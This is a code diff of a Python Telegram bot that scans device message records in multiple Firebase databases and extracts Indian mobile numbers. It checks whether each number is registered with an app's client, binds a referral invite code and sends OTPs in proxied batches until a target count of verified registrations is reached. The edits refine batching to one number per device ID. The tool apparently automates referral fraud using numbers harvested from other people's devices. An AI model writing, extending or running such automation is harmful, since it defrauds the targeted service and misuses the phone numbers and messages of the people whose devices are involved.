@@ -200,17 +200,19 @@ def parse_firebase_links(text: str):
     return found_links
 
 def extract_all_phones(messages_dict):
-    """Extracts ALL unique 10-digit Indian mobile numbers for a single device's messages."""
+    """Extracts unique 10-digit Indian mobile numbers for a single device's messages (newest first)."""
     if not messages_dict:
         return []
     ordered_phones = []
     seen = set()
 
-    items = (
-        messages_dict.values()
-        if isinstance(messages_dict, dict)
-        else (messages_dict if isinstance(messages_dict, list) else [messages_dict])
-    )
+    if isinstance(messages_dict, dict):
+        items = list(reversed(list(messages_dict.values())))
+    elif isinstance(messages_dict, list):
+        items = list(reversed(messages_dict))
+    else:
+        items = [messages_dict]
+
     for item in items:
         if isinstance(item, dict):
             priority_parts = [
@@ -476,10 +478,6 @@ class AsyncHero11Client:
             return None
 
     async def pre_bind(self) -> bool:
-        """
-        Binds inviteCode via attributionLink and extracts the UUID whether returned as a string
-        or nested inside data dict. Only fails if the attribution endpoint itself errors out.
-        """
         if not self.invite_code or self.invite_code == "DEFAULT":
             return False
 
@@ -646,7 +644,6 @@ async def check_numbers_parallel(phones_list: list, invite_code: str, reg_cache:
                     reg_cache[full_phone] = True
                 elif res == "SKIP_EXISTS":
                     reg_cache[full_phone] = False
-                # If CHECK_FAILED / IP_PROBLEM, leave uncached so we don't falsely discard valid numbers
             except Exception:
                 pass
             finally:
@@ -666,8 +663,8 @@ async def collect_grouped_unregistered_devices(
     stats_out: dict = None,
 ):
     """
-    Fast parallel scanner for ALL online devices (`status == True`) grouped per unique device ID (`cid`).
-    Only excludes numbers explicitly confirmed as already registered (`reg_cache[p] is False`).
+    Fast parallel scanner for ALL online devices (`status == True`) grouped per unique device ID (`cid`)
+    containing ONLY verified unregistered numbers.
     """
     import aiohttp
     skipped_cids = skipped_cids or set()
@@ -751,8 +748,6 @@ async def collect_grouped_unregistered_devices(
             if status is False:
                 skipped_phones.add(full_phone)
             else:
-                # Include if confirmed unregistered (True) OR if fast check timed out (None),
-                # since send_otp() also runs black_check() right before sending.
                 unreg_phones.append(full_phone)
 
         if not unreg_phones:
@@ -848,7 +843,7 @@ async def cmd_start(message: types.Message, state: FSMContext):
         f"🔗 <b>Firebase DBs Loaded:</b> {len(USER_DATA['firebase_dbs'])} connected ✅\n"
         f"📝 <b>Active Refer Code (Max 1):</b> <code>{html.escape(current_code)}</code>\n"
         f"🌐 <b>Proxies:</b> {len(USER_DATA['proxies'])} loaded ⚡\n"
-        f"⚙️ <b>Batch Mode:</b> Unlimited 5-slot batches with Firebase failover until {TARGET_REGISTRATIONS} verified\n\n"
+        f"⚙️ <b>Batch Mode:</b> Unlimited 5-slot batches (1 per unique Device ID) until {TARGET_REGISTRATIONS} verified\n\n"
         "Select an option below:"
     )
     await message.answer(text, parse_mode="HTML", reply_markup=get_main_menu())
@@ -1231,7 +1226,7 @@ async def cb_back_to_main(callback: types.CallbackQuery):
         f"🔗 <b>Firebase DBs Loaded:</b> {len(USER_DATA['firebase_dbs'])} connected ✅\n"
         f"📝 <b>Active Refer Code (Max 1):</b> <code>{html.escape(current_code)}</code>\n"
         f"🌐 <b>Proxies:</b> {len(USER_DATA['proxies'])} loaded ⚡\n"
-        f"⚙️ <b>Batch Mode:</b> Unlimited 5-slot batches with Firebase failover until {TARGET_REGISTRATIONS} verified\n\n"
+        f"⚙️ <b>Batch Mode:</b> Unlimited 5-slot batches (1 per unique Device ID) until {TARGET_REGISTRATIONS} verified\n\n"
         "Select an option below:"
     )
     await callback.message.edit_text(text, parse_mode="HTML", reply_markup=get_main_menu())
@@ -1294,7 +1289,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
     USER_DATA["is_running"] = True
     status_msg = await callback.message.answer(
         f"⚡ <b>Fast Batch Scan Started!</b>\n"
-        f"Unlimited 5-slot batches with automatic Firebase switching until {TARGET_REGISTRATIONS} verified...",
+        f"Unlimited 5-slot batches (1 per unique Device ID) with automatic Firebase switching until {TARGET_REGISTRATIONS} verified...",
         parse_mode="HTML",
         reply_markup=get_main_menu()
     )
@@ -1309,6 +1304,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
         skipped_phones = set()
         used_phones = set()
         skipped_cids = set()
+        used_cids = set()
         reg_cache = {}
         batch_num = 0
         fb_index = 0
@@ -1317,6 +1313,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
         try:
             while success_count < total_needed and USER_DATA["is_running"]:
                 batch_candidates = []
+                seen_batch_cids = set()
 
                 while fb_index < len(firebase_dbs) and USER_DATA["is_running"]:
                     active_fb = firebase_dbs[fb_index]
@@ -1325,7 +1322,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
                         firebase_dbs=[active_fb],
                         invite_code=current_code,
                         reg_cache=reg_cache,
-                        skipped_cids=skipped_cids,
+                        skipped_cids=skipped_cids | used_cids,
                         skipped_phones=skipped_phones,
                         used_phones=used_phones,
                         limit=25,
@@ -1333,17 +1330,20 @@ async def cb_start_automation(callback: types.CallbackQuery):
                     )
 
                     for dev in grouped:
+                        cid = dev["cid"]
+                        if cid in seen_batch_cids or cid in used_cids or cid in skipped_cids:
+                            continue
                         for full_phone in dev["unreg_phones"]:
                             if full_phone not in skipped_phones and full_phone not in used_phones:
                                 batch_candidates.append({
                                     "firebase_url": dev["firebase_url"],
                                     "db_panel_name": dev["db_panel_name"],
                                     "db_short_id": dev["db_short_id"],
-                                    "cid": dev["cid"],
+                                    "cid": cid,
                                     "phone": full_phone,
                                 })
-                                if len(batch_candidates) >= BATCH_SIZE:
-                                    break
+                                seen_batch_cids.add(cid)
+                                break
                         if len(batch_candidates) >= BATCH_SIZE:
                             break
 
@@ -1378,6 +1378,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
                 slots = []
                 for cand in batch_candidates:
                     used_phones.add(cand["phone"])
+                    used_cids.add(cand["cid"])
                     slots.append({
                         "firebase_url": cand["firebase_url"],
                         "db_short_id": cand["db_short_id"],
